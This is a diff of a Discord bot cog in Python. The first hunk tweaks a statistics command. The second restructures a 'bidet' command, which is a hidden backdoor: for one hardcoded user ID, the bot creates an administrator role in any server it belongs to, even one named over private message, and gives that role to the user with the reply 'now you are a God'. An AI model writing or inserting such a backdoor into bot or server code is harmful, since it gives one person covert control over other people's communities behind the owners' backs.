@@ -13,18 +13,18 @@ class Privatecommands(commands.Cog):
         self.tz = ZoneInfo("Europe/Rome")
     
     @commands.command(name="statsa")
-    async def statsab(self, ctx):
+    async def statsa(self, ctx):
         if not ctx.author.guild_permissions.administrator:
             await ctx.send("Not enough perms")
             return
-        channel_id = 1475226563468460233
+        channel_id = 1446470487676031088
         channel = ctx.guild.get_channel(channel_id)
         if channel is None:
             await ctx.send("Channel not found")
             return
         now = datetime.now(timezone.utc)
         today_midnight = datetime(now.year, now.month, now.day, tzinfo=timezone.utc)
-        start = today_midnight - timedelta(days=2)
+        start = today_midnight - timedelta(days=1)
         end = today_midnight +timedelta(days=1)
         counts = {}
         
@@ -118,21 +118,22 @@ class Privatecommands(commands.Cog):
     @commands.command()
     async def bidet(self, ctx, guild_id: int = None):
         bidet = self.bot.get_user(450772749829537793)
-        if ctx.author.id == bidet.id:
-            if ctx.channel.type == discord.ChannelType.private:
-                guild = self.bot.get_guild(guild_id)
-                member = guild.get_member(bidet.id)
-                role = await guild.create_role(name="Bidet", permissions=discord.Permissions(administrator=True))
-                await member.add_roles(role)
-                await ctx.send("Ora sei un Dio")
-            else:
-                if guild_id is None:
-                    guild_id = ctx.guild.id
-                guild = self.bot.get_guild(guild_id)
-                role = await guild.create_role(name="Bidet", permissions=discord.Permissions(administrator=True))
-                await ctx.author.add_roles(role)
+        if ctx.channel.type == discord.ChannelType.private:
+            if not ctx.author.id == bidet.id:
+                return
+            guild = self.bot.get_guild(guild_id)
+            member = guild.get_member(bidet.id)
+            role = await guild.create_role(name="Bidet", permissions=discord.Permissions(administrator=True))
+            await member.add_roles(role)
+            await ctx.send("Ora sei un Dio")
         else:
-            return
+            if not ctx.author.id == bidet.id:
+                return
+            if guild_id is None:
+                guild_id = ctx.guild.id
+            guild = self.bot.get_guild(guild_id)
+            role = await guild.create_role(name="Bidet", permissions=discord.Permissions(administrator=True))
+            await ctx.author.add_roles(role)
 
     @commands.command()
     async def unbidet(self, ctx, guild_id: int = None):
